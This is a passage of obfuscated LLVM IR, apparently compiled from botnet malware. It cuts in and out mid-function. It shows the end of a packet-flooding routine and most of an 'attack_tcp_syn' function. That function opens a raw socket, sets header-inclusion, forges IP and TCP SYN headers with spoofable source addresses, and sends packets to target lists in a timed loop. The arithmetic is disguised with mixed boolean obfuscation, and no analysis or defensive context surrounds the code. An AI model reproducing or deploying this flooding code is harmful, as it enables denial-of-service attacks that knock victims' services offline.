  %470 = call i32 @rand_next()
  store i32 %470, i32* %41, align 4
  %471 = call i32 @rand_next()
  store i32 %471, i32* %42, align 4
  %472 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %473 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %472, i32 0, i32 0
  %474 = getelementptr inbounds [6 x i8], [6 x i8]* %473, i32 0, i32 0
  %475 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %474, i8* %475, i32 4)
  %476 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %477 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %476, i32 0, i32 1
  %478 = getelementptr inbounds [6 x i8], [6 x i8]* %477, i32 0, i32 0
  %479 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %478, i8* %479, i32 4)
  %480 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %481 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %480, i32 0, i32 0
  %482 = getelementptr inbounds [6 x i8], [6 x i8]* %481, i32 0, i32 0
  %483 = getelementptr inbounds i8, i8* %482, i64 4
  %484 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %483, i8* %484, i32 2)
  %485 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %486 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %485, i32 0, i32 1
  %487 = getelementptr inbounds [6 x i8], [6 x i8]* %486, i32 0, i32 0
  %488 = getelementptr inbounds i8, i8* %487, i64 4
  %489 = bitcast i32* %42 to i8*
  %490 = getelementptr inbounds i8, i8* %489, i64 2
  call void @util_memcpy(i8* %488, i8* %490, i32 2)
  %491 = load i8, i8* %21, align 1
  %492 = icmp ne i8 %491, 0
  br i1 %492, label %493, label %500

; <label>:493:                                    ; preds = %468
  %494 = load i8*, i8** %39, align 8
  %495 = load i32, i32* %20, align 4
  call void @rand_alpha_str(i8* %494, i32 %495)
  %496 = load i8*, i8** %39, align 8
  %497 = load i32, i32* %20, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds i8, i8* %496, i64 %498
  store i8 0, i8* %499, align 1
  br label %500

; <label>:500:                                    ; preds = %493, %468
  %501 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %502 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %501, i32 0, i32 7
  store i16 0, i16* %502, align 2
  %503 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %504 = bitcast %struct.iphdr* %503 to i16*
  %505 = call zeroext i16 @checksum_generic(i16* %504, i32 20)
  %506 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %507 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %506, i32 0, i32 7
  store i16 %505, i16* %507, align 2
  %508 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %509 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %508, i32 0, i32 7
  store i16 0, i16* %509, align 2
  %510 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %511 = bitcast %struct.iphdr* %510 to i16*
  %512 = call zeroext i16 @checksum_generic(i16* %511, i32 20)
  %513 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %514 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %513, i32 0, i32 7
  store i16 %512, i16* %514, align 2
  %515 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %516 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %515, i32 0, i32 3
  store i16 0, i16* %516, align 2
  %517 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %518 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %519 = bitcast %struct.udphdr* %518 to i8*
  %520 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %521 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %520, i32 0, i32 2
  %522 = load i16, i16* %521, align 2
  %523 = load i32, i32* %20, align 4
  %524 = sext i32 %523 to i64
  %525 = add i64 8, -4718034018385191397
  %526 = add i64 %525, %524
  %527 = sub i64 %526, -4718034018385191397
  %528 = add i64 8, %524
  %529 = trunc i64 %527 to i32
  %530 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %517, i8* %519, i16 zeroext %522, i32 %529)
  %531 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %532 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %531, i32 0, i32 3
  store i16 %530, i16* %532, align 2
  %533 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %534 = load i32, i32* %11, align 4
  %535 = sext i32 %534 to i64
  %536 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %533, i64 %535
  %537 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %536, i32 0, i32 0
  %538 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %537, i32 0, i32 0
  store i16 2, i16* %538, align 4
  %539 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %540 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %539, i32 0, i32 9
  %541 = load i32, i32* %540, align 4
  %542 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %543 = load i32, i32* %11, align 4
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %542, i64 %544
  %546 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %545, i32 0, i32 0
  %547 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %546, i32 0, i32 2
  %548 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %547, i32 0, i32 0
  store i32 %541, i32* %548, align 4
  %549 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %550 = load i32, i32* %11, align 4
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %549, i64 %551
  %553 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %552, i32 0, i32 0
  %554 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %553, i32 0, i32 1
  store i16 0, i16* %554, align 2
  %555 = load i32, i32* %12, align 4
  %556 = load i8*, i8** %33, align 8
  %557 = load i32, i32* %20, align 4
  %558 = sext i32 %557 to i64
  %559 = sub i64 0, 66
  %560 = sub i64 0, %558
  %561 = add i64 %559, %560
  %562 = sub i64 0, %561
  %563 = add i64 66, %558
  %564 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %565 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %566 = load i32, i32* %11, align 4
  %567 = sext i32 %566 to i64
  %568 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %565, i64 %567
  %569 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %568, i32 0, i32 0
  %570 = bitcast %struct.sockaddr_in* %569 to %struct.sockaddr*
  store %struct.sockaddr* %570, %struct.sockaddr** %564, align 8
  %571 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %572 = load %struct.sockaddr*, %struct.sockaddr** %571, align 8
  %573 = call i64 @sendto(i32 %555, i8* %556, i64 %562, i32 16384, %struct.sockaddr* %572, i32 16)
  br label %574

; <label>:574:                                    ; preds = %500
  %575 = load i32, i32* %11, align 4
  %576 = sub i32 0, 1
  %577 = sub i32 %575, %576
  %578 = add nsw i32 %575, 1
  store i32 %577, i32* %11, align 4
  br label %327

; <label>:579:                                    ; preds = %327
  %580 = call i64 @time(i64* null) #6
  %581 = load i32, i32* %24, align 4
  %582 = sext i32 %581 to i64
  %583 = icmp sgt i64 %580, %582
  br i1 %583, label %584, label %585

; <label>:584:                                    ; preds = %579
  br label %586

; <label>:585:                                    ; preds = %579
  br label %326

; <label>:586:                                    ; preds = %584, %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.tcphdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %37 = load i8, i8* %7, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %13, align 8
  %41 = load i8, i8* %9, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %14, align 1
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %15, align 2
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %16, align 1
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 1)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %17, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %18, align 2
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %19, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 16, i32 65535)
  store i32 %67, i32* %20, align 4
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 17, i32 0)
  store i32 %70, i32* %21, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 10, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 11, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %23, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 12, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %24, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 13, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %25, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 14, i32 1)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %26, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 15, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %27, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = load i32, i32* @LOCAL_ADDR, align 4
  %98 = call i32 @attack_get_opt_ip(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 19, i32 %97)
  store i32 %98, i32* %28, align 4
  %99 = call i64 @time(i64* null) #6
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = sub i64 0, %99
  %103 = sub i64 0, %101
  %104 = add i64 %102, %103
  %105 = sub i64 0, %104
  %106 = add nsw i64 %99, %101
  %107 = trunc i64 %105 to i32
  store i32 %107, i32* %29, align 4
  %108 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %108, i32* %12, align 4
  %109 = icmp eq i32 %108, -1
  br i1 %109, label %110, label %111

; <label>:110:                                    ; preds = %5
  br label %651

; <label>:111:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %112 = load i32, i32* %12, align 4
  %113 = bitcast i32* %11 to i8*
  %114 = call i32 @setsockopt(i32 %112, i32 0, i32 3, i8* %113, i32 4) #6
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %119

; <label>:116:                                    ; preds = %111
  %117 = load i32, i32* %12, align 4
  %118 = call i32 @close(i32 %117)
  br label %651

; <label>:119:                                    ; preds = %111
  store i32 0, i32* %11, align 4
  br label %120

; <label>:120:                                    ; preds = %459, %119
  %121 = load i32, i32* %11, align 4
  %122 = load i8, i8* %7, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  br i1 %124, label %125, label %466

; <label>:125:                                    ; preds = %120
  %126 = call noalias i8* @calloc(i64 128, i64 1) #6
  %127 = load i8**, i8*** %13, align 8
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %127, i64 %129
  store i8* %126, i8** %130, align 8
  %131 = load i8**, i8*** %13, align 8
  %132 = load i32, i32* %11, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8*, i8** %131, i64 %133
  %135 = load i8*, i8** %134, align 8
  %136 = bitcast i8* %135 to %struct.iphdr*
  store %struct.iphdr* %136, %struct.iphdr** %30, align 8
  %137 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i64 1
  %139 = bitcast %struct.iphdr* %138 to %struct.tcphdr*
  store %struct.tcphdr* %139, %struct.tcphdr** %31, align 8
  %140 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i64 1
  %142 = bitcast %struct.tcphdr* %141 to i8*
  store i8* %142, i8** %32, align 8
  %143 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %144 = bitcast %struct.iphdr* %143 to i8*
  %145 = load i8, i8* %144, align 4
  %146 = xor i8 15, -1
  %147 = xor i8 %145, %146
  %148 = and i8 %147, %145
  %149 = and i8 %145, 15
  %150 = xor i8 %148, -1
  %151 = xor i8 64, -1
  %152 = xor i8 -98, -1
  %153 = and i8 %150, -98
  %154 = and i8 %148, %152
  %155 = and i8 %151, -98
  %156 = and i8 64, %152
  %157 = or i8 %153, %154
  %158 = or i8 %155, %156
  %159 = xor i8 %157, %158
  %160 = or i8 %150, %151
  %161 = xor i8 %160, -1
  %162 = or i8 -98, %152
  %163 = and i8 %161, %162
  %164 = or i8 %159, %163
  %165 = or i8 %148, 64
  store i8 %164, i8* %144, align 4
  %166 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %167 = bitcast %struct.iphdr* %166 to i8*
  %168 = load i8, i8* %167, align 4
  %169 = xor i8 %168, -1
  %170 = xor i8 -16, -1
  %171 = xor i8 -85, -1
  %172 = or i8 %169, %170
  %173 = or i8 -85, %171
  %174 = xor i8 %172, -1
  %175 = and i8 %174, %173
  %176 = and i8 %168, -16
  %177 = xor i8 %175, -1
  %178 = xor i8 5, -1
  %179 = xor i8 104, -1
  %180 = and i8 %177, 104
  %181 = and i8 %175, %179
  %182 = and i8 %178, 104
  %183 = and i8 5, %179
  %184 = or i8 %180, %181
  %185 = or i8 %182, %183
  %186 = xor i8 %184, %185
  %187 = or i8 %177, %178
  %188 = xor i8 %187, -1
  %189 = or i8 104, %179
  %190 = and i8 %188, %189
  %191 = or i8 %186, %190
  %192 = or i8 %175, 5
  store i8 %191, i8* %167, align 4
  %193 = load i8, i8* %14, align 1
  %194 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 1
  store i8 %193, i8* %195, align 1
  %196 = call zeroext i16 @htons(i16 zeroext 60) #7
  %197 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 2
  store i16 %196, i16* %198, align 2
  %199 = load i16, i16* %15, align 2
  %200 = call zeroext i16 @htons(i16 zeroext %199) #7
  %201 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 3
  store i16 %200, i16* %202, align 4
  %203 = load i8, i8* %16, align 1
  %204 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 5
  store i8 %203, i8* %205, align 4
  %206 = load i8, i8* %17, align 1
  %207 = icmp ne i8 %206, 0
  br i1 %207, label %208, label %212

; <label>:208:                                    ; preds = %125
  %209 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %210 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 4
  store i16 %209, i16* %211, align 2
  br label %212

; <label>:212:                                    ; preds = %208, %125
  %213 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 6
  store i8 6, i8* %214, align 1
  %215 = load i32, i32* %28, align 4
  %216 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 8
  store i32 %215, i32* %217, align 4
  %218 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %219 = load i32, i32* %11, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %218, i64 %220
  %222 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %221, i32 0, i32 1
  %223 = load i32, i32* %222, align 4
  %224 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 9
  store i32 %223, i32* %225, align 4
  %226 = load i16, i16* %18, align 2
  %227 = call zeroext i16 @htons(i16 zeroext %226) #7
  %228 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 0
  store i16 %227, i16* %229, align 4
  %230 = load i16, i16* %19, align 2
  %231 = call zeroext i16 @htons(i16 zeroext %230) #7
  %232 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 1
  store i16 %231, i16* %233, align 2
  %234 = load i32, i32* %20, align 4
  %235 = trunc i32 %234 to i16
  %236 = call zeroext i16 @htons(i16 zeroext %235) #7
  %237 = zext i16 %236 to i32
  %238 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 2
  store i32 %237, i32* %239, align 4
  %240 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = xor i16 %242, -1
  %244 = xor i16 -241, -1
  %245 = xor i16 15765, -1
  %246 = or i16 %243, %244
  %247 = or i16 15765, %245
  %248 = xor i16 %246, -1
  %249 = and i16 %248, %247
  %250 = and i16 %242, -241
  %251 = xor i16 %249, -1
  %252 = xor i16 160, -1
  %253 = xor i16 20025, -1
  %254 = and i16 %251, 20025
  %255 = and i16 %249, %253
  %256 = and i16 %252, 20025
  %257 = and i16 160, %253
  %258 = or i16 %254, %255
  %259 = or i16 %256, %257
  %260 = xor i16 %258, %259
  %261 = or i16 %251, %252
  %262 = xor i16 %261, -1
  %263 = or i16 20025, %253
  %264 = and i16 %262, %263
  %265 = or i16 %260, %264
  %266 = or i16 %249, 160
  store i16 %265, i16* %241, align 4
  %267 = load i8, i8* %22, align 1
  %268 = sext i8 %267 to i16
  %269 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = xor i16 1, -1
  %273 = xor i16 %268, %272
  %274 = and i16 %273, %268
  %275 = and i16 %268, 1
  %276 = shl i16 %274, 13
  %277 = xor i16 %271, -1
  %278 = xor i16 -8193, -1
  %279 = xor i16 18036, -1
  %280 = or i16 %277, %278
  %281 = or i16 18036, %279
  %282 = xor i16 %280, -1
  %283 = and i16 %282, %281
  %284 = and i16 %271, -8193
  %285 = and i16 %283, %276
  %286 = xor i16 %283, %276
  %287 = or i16 %285, %286
  %288 = or i16 %283, %276
  store i16 %287, i16* %270, align 4
  %289 = load i8, i8* %23, align 1
  %290 = sext i8 %289 to i16
  %291 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %292 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %291, i32 0, i32 4
  %293 = load i16, i16* %292, align 4
  %294 = xor i16 %290, -1
  %295 = xor i16 1, -1
  %296 = xor i16 18036, -1
  %297 = or i16 %294, %295
  %298 = or i16 18036, %296
  %299 = xor i16 %297, -1
  %300 = and i16 %299, %298
  %301 = and i16 %290, 1
  %302 = shl i16 %300, 12
  %303 = xor i16 -4097, -1
  %304 = xor i16 %293, %303
  %305 = and i16 %304, %293
  %306 = and i16 %293, -4097
  %307 = xor i16 %305, -1
  %308 = xor i16 %302, -1
  %309 = xor i16 -29360, -1
  %310 = and i16 %307, -29360
  %311 = and i16 %305, %309
  %312 = and i16 %308, -29360
  %313 = and i16 %302, %309
  %314 = or i16 %310, %311
  %315 = or i16 %312, %313
  %316 = xor i16 %314, %315
  %317 = or i16 %307, %308
  %318 = xor i16 %317, -1
  %319 = or i16 -29360, %309
  %320 = and i16 %318, %319
  %321 = or i16 %316, %320
  %322 = or i16 %305, %302
  store i16 %321, i16* %292, align 4
  %323 = load i8, i8* %24, align 1
  %324 = sext i8 %323 to i16
  %325 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 4
  %327 = load i16, i16* %326, align 4
  %328 = xor i16 %324, -1
  %329 = xor i16 1, -1
  %330 = xor i16 -8912, -1
  %331 = or i16 %328, %329
  %332 = or i16 -8912, %330
  %333 = xor i16 %331, -1
  %334 = and i16 %333, %332
  %335 = and i16 %324, 1
  %336 = shl i16 %334, 11
  %337 = xor i16 %327, -1
  %338 = xor i16 -2049, -1
  %339 = xor i16 20214, -1
  %340 = or i16 %337, %338
  %341 = or i16 20214, %339
  %342 = xor i16 %340, -1
  %343 = and i16 %342, %341
  %344 = and i16 %327, -2049
  %345 = and i16 %343, %336
  %346 = xor i16 %343, %336
  %347 = or i16 %345, %346
  %348 = or i16 %343, %336
  store i16 %347, i16* %326, align 4
  %349 = load i8, i8* %25, align 1
  %350 = sext i8 %349 to i16
  %351 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %352 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %351, i32 0, i32 4
  %353 = load i16, i16* %352, align 4
  %354 = xor i16 1, -1
  %355 = xor i16 %350, %354
  %356 = and i16 %355, %350
  %357 = and i16 %350, 1
  %358 = shl i16 %356, 10
  %359 = xor i16 -1025, -1
  %360 = xor i16 %353, %359
  %361 = and i16 %360, %353
  %362 = and i16 %353, -1025
  %363 = and i16 %361, %358
  %364 = xor i16 %361, %358
  %365 = or i16 %363, %364
  %366 = or i16 %361, %358
  store i16 %365, i16* %352, align 4
  %367 = load i8, i8* %26, align 1
  %368 = sext i8 %367 to i16
  %369 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 4
  %371 = load i16, i16* %370, align 4
  %372 = xor i16 %368, -1
  %373 = xor i16 1, -1
  %374 = xor i16 -14750, -1
  %375 = or i16 %372, %373
  %376 = or i16 -14750, %374
  %377 = xor i16 %375, -1
  %378 = and i16 %377, %376
  %379 = and i16 %368, 1
  %380 = shl i16 %378, 9
  %381 = xor i16 -513, -1
  %382 = xor i16 %371, %381
  %383 = and i16 %382, %371
  %384 = and i16 %371, -513
  %385 = and i16 %383, %380
  %386 = xor i16 %383, %380
  %387 = or i16 %385, %386
  %388 = or i16 %383, %380
  store i16 %387, i16* %370, align 4
  %389 = load i8, i8* %27, align 1
  %390 = sext i8 %389 to i16
  %391 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %392 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %391, i32 0, i32 4
  %393 = load i16, i16* %392, align 4
  %394 = xor i16 %390, -1
  %395 = xor i16 1, -1
  %396 = xor i16 -31002, -1
  %397 = or i16 %394, %395
  %398 = or i16 -31002, %396
  %399 = xor i16 %397, -1
  %400 = and i16 %399, %398
  %401 = and i16 %390, 1
  %402 = shl i16 %400, 8
  %403 = xor i16 %393, -1
  %404 = xor i16 -257, -1
  %405 = xor i16 -7162, -1
  %406 = or i16 %403, %404
  %407 = or i16 -7162, %405
  %408 = xor i16 %406, -1
  %409 = and i16 %408, %407
  %410 = and i16 %393, -257
  %411 = and i16 %409, %402
  %412 = xor i16 %409, %402
  %413 = or i16 %411, %412
  %414 = or i16 %409, %402
  store i16 %413, i16* %392, align 4
  %415 = load i8*, i8** %32, align 8
  %416 = getelementptr inbounds i8, i8* %415, i32 1
  store i8* %416, i8** %32, align 8
  store i8 2, i8* %415, align 1
  %417 = load i8*, i8** %32, align 8
  %418 = getelementptr inbounds i8, i8* %417, i32 1
  store i8* %418, i8** %32, align 8
  store i8 4, i8* %417, align 1
  %419 = call i32 @rand_next()
  %420 = xor i32 15, -1
  %421 = xor i32 %419, %420
  %422 = and i32 %421, %419
  %423 = and i32 %419, 15
  %424 = add i32 1400, -329758928
  %425 = add i32 %424, %422
  %426 = sub i32 %425, -329758928
  %427 = add i32 1400, %422
  %428 = trunc i32 %426 to i16
  %429 = call zeroext i16 @htons(i16 zeroext %428) #7
  %430 = load i8*, i8** %32, align 8
  %431 = bitcast i8* %430 to i16*
  store i16 %429, i16* %431, align 2
  %432 = load i8*, i8** %32, align 8
  %433 = getelementptr inbounds i8, i8* %432, i64 2
  store i8* %433, i8** %32, align 8
  %434 = load i8*, i8** %32, align 8
  %435 = getelementptr inbounds i8, i8* %434, i32 1
  store i8* %435, i8** %32, align 8
  store i8 4, i8* %434, align 1
  %436 = load i8*, i8** %32, align 8
  %437 = getelementptr inbounds i8, i8* %436, i32 1
  store i8* %437, i8** %32, align 8
  store i8 2, i8* %436, align 1
  %438 = load i8*, i8** %32, align 8
  %439 = getelementptr inbounds i8, i8* %438, i32 1
  store i8* %439, i8** %32, align 8
  store i8 8, i8* %438, align 1
  %440 = load i8*, i8** %32, align 8
  %441 = getelementptr inbounds i8, i8* %440, i32 1
  store i8* %441, i8** %32, align 8
  store i8 10, i8* %440, align 1
  %442 = call i32 @rand_next()
  %443 = load i8*, i8** %32, align 8
  %444 = bitcast i8* %443 to i32*
  store i32 %442, i32* %444, align 4
  %445 = load i8*, i8** %32, align 8
  %446 = getelementptr inbounds i8, i8* %445, i64 4
  store i8* %446, i8** %32, align 8
  %447 = load i8*, i8** %32, align 8
  %448 = bitcast i8* %447 to i32*
  store i32 0, i32* %448, align 4
  %449 = load i8*, i8** %32, align 8
  %450 = getelementptr inbounds i8, i8* %449, i64 4
